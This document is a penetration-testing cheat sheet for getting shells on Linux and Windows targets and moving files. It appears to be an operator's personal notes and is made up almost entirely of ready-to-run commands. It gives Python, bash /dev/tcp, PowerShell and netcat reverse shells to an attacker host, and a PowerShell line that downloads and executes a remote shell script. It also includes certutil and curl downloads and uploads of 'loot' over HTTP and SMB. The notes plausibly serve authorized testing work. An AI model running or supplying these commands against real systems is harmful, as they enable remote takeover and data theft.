# Shell Delivery and Transfer

## Port Conventions
| Purpose               | Primary | Fallback |
| --------------------- | ------- | -------- |
| File server           | `80`    | `8080`   |
| Reverse shell handler | `443`   | `4444`   |

## Working directory convention

Use these shared scratch directories unless the target gives you a reason not to:

- Windows: `C:\Windows\Temp\working`
- Linux: `/tmp/working`

Treat both as disposable. They may be cleared by the OS, service restarts, or reboot.

# Kali

## Primary payload server
```bash
payload-server linux 80
payload-server windows 80 443
```

## Start the handler
```bash
penelope -O 443
```

## Fallback file server
```bash
python3 -m http.server 80
```

## Start authenticated SMB share
```bash
impacket-smbserver share . -smb2support -username user -password pass
```

# Linux Target
## Setup
```bash
LHOST=<LHOST or already exported>
wd=/tmp/working
mkdir -p "$wd"
```

## Primary reverse shell
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect((os.environ["LHOST"],443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

## Fallback reverse shell
```bash
bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'
```

## Primary file download
```bash
curl -o "$wd/file" "http://$LHOST/file"
```

## Primary file upload
```bash
curl -X POST --data-binary @"$wd/loot.txt" "http://$LHOST/upload?name=loot.txt"
```

## Fallback file download
```bash
wget "http://$LHOST/file" -O "$wd/file"
```

# Windows Target
## Setup (PowerShell)
```powershell
$LHOST = '<LHOST or already exported>'
$wd = 'C:\Windows\Temp\working'
New-Item -ItemType Directory -Force -Path $wd | Out-Null
```

## Setup (cmd.exe)
```cmd
set LHOST=<LHOST>
set WD=C:\Windows\Temp\working
mkdir %WD%
```

## Primary reverse shell
```powershell
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient($env:LHOST,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Fallback reverse shell
```cmd
nc64.exe %LHOST% 4444 -e cmd.exe
```

## Upgrade a Windows shell
```powershell
IEX(IWR "http://$env:LHOST/Invoke-ConPtyShell.ps1" -UseBasicParsing); Invoke-ConPtyShell $env:LHOST 443
```

## Primary file download
```powershell
$file = 'file.exe'
Invoke-WebRequest -UseBasicParsing -Uri "http://$LHOST/$file" -OutFile (Join-Path $wd $file)
```

## Primary file upload
```powershell
$file = 'file.exe'
Invoke-WebRequest -UseBasicParsing -Method POST -InFile (Join-Path $wd $file) -Uri "http://$LHOST/upload?name=$file"
```

## Fallback file download
```cmd
set FILE=file.exe
certutil -urlcache -split -f http://%LHOST%/%FILE% %WD%\%FILE%
```

## Bulk transfer if creds already work
```cmd
net use Z: \\%LHOST%\share /user:user pass
set FILE=file.exe
copy Z:\%FILE% %WD%\%FILE%
copy %WD%\loot.zip Z:\downloads\loot.zip
```

## Map SMB share to Z and stage files
```cmd
cd %WD%
net use Z: \\%LHOST%\share /user:user pass
```
